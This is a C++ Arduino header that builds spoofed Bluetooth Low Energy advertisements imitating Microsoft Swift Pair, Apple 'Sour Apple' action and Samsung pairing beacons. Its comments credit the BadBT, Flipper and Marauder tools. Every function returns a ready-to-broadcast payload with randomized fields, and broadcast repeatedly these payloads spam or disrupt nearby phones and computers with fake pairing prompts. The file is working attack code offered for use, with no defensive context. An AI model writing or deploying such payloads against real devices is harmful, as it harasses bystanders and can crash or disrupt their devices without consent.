#pragma once

#include <Arduino.h>
#include <NimBLEDevice.h>
#include <vector>

class BLEPayloads {
public:
  static NimBLEAdvertisementData getMicrosoftPayload() {
    NimBLEAdvertisementData advData;

    // Microsoft Swift Pair Beacon (Verified BadBT/Flipper Style)
    // Structure:
    // [Len] [0xFF] [0x06 0x00] [Beacon ID 0x03] [SubScenario 0x00] [Reserved
    // 0x80] [Random Name]

    // 1. Generate Random Name (e.g. "Surface Buds 823")
    const char *devices[] = {"Surface", "Xbox", "Headphones", "Mouse", "Pen"};
    String deviceName = devices[rand() % 5];
    deviceName += " ";
    deviceName += String(random(100, 999));

    size_t nameLen = deviceName.length();

    // 2. Build Payload
    // 0x06 0x00 (Microsoft ID) + 0x03 (Beacon) + 0x00 (Scenario) + 0x80
    // (Reserved)
    uint8_t totalLen = 5 + nameLen;
    uint8_t payload[32];

    uint8_t i = 0;
    payload[i++] = 0x06; // Microsoft ID Low
    payload[i++] = 0x00; // Microsoft ID High
    payload[i++] = 0x03; // Swift Pair Beacon ID
    payload[i++] = 0x00; // Scenario (0 = Connect)
    payload[i++] = 0x80; // Reserved RSSI Byte

    memcpy(&payload[i], deviceName.c_str(), nameLen);

    // 3. Set Manufacturer Data (Adds Len + 0xFF automatically)
    // Note: NimBLE's setManufacturerData expects just the data,
    // it prefixes Len and 0xFF.
    advData.setManufacturerData(std::string((char *)payload, totalLen));

    // 4. Critical: Set Flags
    advData.setFlags(0x06); // General Discoverable + BLE Only

    return advData;
  }

  static NimBLEAdvertisementData getApplePayload() {
    NimBLEAdvertisementData advData;

    // Marauder "Apple Actions" Payload (Sour Apple)
    // 0x0A, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC0, [Type], [Random x3] ...

    uint8_t payload[11];
    uint8_t i = 0;

    payload[i++] = 0x0A; // Length
    payload[i++] = 0xFF; // Manufacturer Specific
    payload[i++] = 0x4C; // Apple ID Low
    payload[i++] = 0x00; // Apple ID High
    payload[i++] = 0x0F; // Type
    payload[i++] = 0x05; // Length?
    payload[i++] = 0xC0; // Action Flags

    const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b,
                             0x2f, 0x01, 0x06, 0x20};
    payload[i++] = types[rand() % sizeof(types)]; // Random Action

    payload[i++] = (uint8_t)random(256);
    payload[i++] = (uint8_t)random(256);
    payload[i++] = (uint8_t)random(256);

    advData.addData(std::string((char *)payload, 11));
    return advData;
  }

  static NimBLEAdvertisementData getSamsungPayload() {
    NimBLEAdvertisementData advData;

    // Marauder Samsung Payload
    // 14, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00,
    // 0x00, 0x43, [Model]

    uint8_t payload[15];
    uint8_t i = 0;

    payload[i++] = 14; // Length
    payload[i++] = 0xFF;
    payload[i++] = 0x75; // Samsung ID Low
    payload[i++] = 0x00; // Samsung ID High
    payload[i++] = 0x01;
    payload[i++] = 0x00;
    payload[i++] = 0x02;
    payload[i++] = 0x00;
    payload[i++] = 0x01;
    payload[i++] = 0x01;
    payload[i++] = 0xFF;
    payload[i++] = 0x00;
    payload[i++] = 0x00;
    payload[i++] = 0x43;
    payload[i++] = (uint8_t)random(256); // Random Model/Color

    advData.addData(std::string((char *)payload, 15));
    return advData;
  }
};
